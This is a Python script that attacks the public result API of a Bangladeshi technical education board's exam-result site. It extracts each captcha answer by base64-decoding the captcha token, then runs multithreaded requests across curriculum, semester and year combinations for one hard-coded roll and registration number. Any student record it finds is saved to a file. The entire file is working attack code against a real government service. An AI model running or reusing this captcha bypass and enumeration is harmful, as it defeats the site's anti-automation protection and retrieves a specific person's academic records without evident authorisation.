import requests, base64
from concurrent.futures import ThreadPoolExecutor

BASE = 'https://result.bteb.gov.bd/api/public'
headers = {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'Origin': 'https://result.bteb.gov.bd',
    'Referer': 'https://result.bteb.gov.bd/',
    'User-Agent': 'Mozilla/5.0'
}

currs = requests.get(f'{BASE}/curriculums', headers=headers, timeout=6).json()

def check_comb(args):
    c_code, sem, yr = args
    try:
        r = requests.get(f'{BASE}/captcha', headers=headers, timeout=4).json()
        tok = r['token']
        decoded = base64.b64decode(tok).decode('utf-8')
        ans = decoded.split('.')[2]
        payload = {
            'curriculumCode': str(c_code),
            'rollNo': '208579',
            'regNo': '1502385808',
            'semester': str(sem),
            'examYear': str(yr),
            'captchaToken': tok,
            'captchaAnswer': ans
        }
        res = requests.post(f'{BASE}/result', headers=headers, json=payload, timeout=5).json()
        if res.get('data') and res.get('data', {}).get('semesters'):
            return (c_code, sem, yr, res['data'])
    except Exception:
        pass
    return None

tasks = []
# Prioritize HSC Voc (26), HSC BM (24, 44), SSC Voc (27), Diploma (15)
priority = ['26', '24', '44', '27', '15', '25', '77']
for c in currs:
    c_code = c.get('curriculumCode')
    if c_code not in priority: continue
    tot_sem = c.get('totalSemesters', 1)
    for sem in range(1, min(tot_sem + 1, 5)):
        for yr in ['2025', '2024', '2023', '2022', '2021', '2020']:
            tasks.append((c_code, sem, yr))

print(f'Checking {len(tasks)} priority combinations...')
found = None
with ThreadPoolExecutor(max_workers=8) as ex:
    for res in ex.map(check_comb, tasks):
        if res:
            found = res
            print('🎉 FOUND REAL BTEB RECORD! 🎉')
            print('Curriculum:', res[0], 'Semester:', res[1], 'Year:', res[2])
            import json
            with open('bteb_found_student.json', 'w', encoding='utf-8') as f:
                json.dump(res[3], f, indent=2)
            break

if not found:
    print('Student not found in prioritized BTEB online tables.')
